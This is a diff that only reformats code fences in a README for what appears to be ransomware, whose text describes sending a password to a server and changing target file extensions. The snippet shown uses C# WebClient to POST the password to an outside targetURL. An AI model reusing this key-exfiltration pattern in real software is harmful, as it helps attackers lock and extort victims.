@@ -27,8 +27,7 @@ https://www.youtube.com/watch?v=LtiRISepIfs
 
 * The script do the POST request to the server (targetURL). Sending process running in `SendPassword()` function
 
-  ```
-  
+```
 using (var client = new WebClient())
    {
        var values = new NameValueCollection();
@@ -37,8 +36,8 @@ using (var client = new WebClient())
        values["password"] = password;
        client.UploadValues(targetURL, "POST", values);
    }
-   
-  ```
+```
+  
 * Example of target file extensions that can be changed:
 
 ```
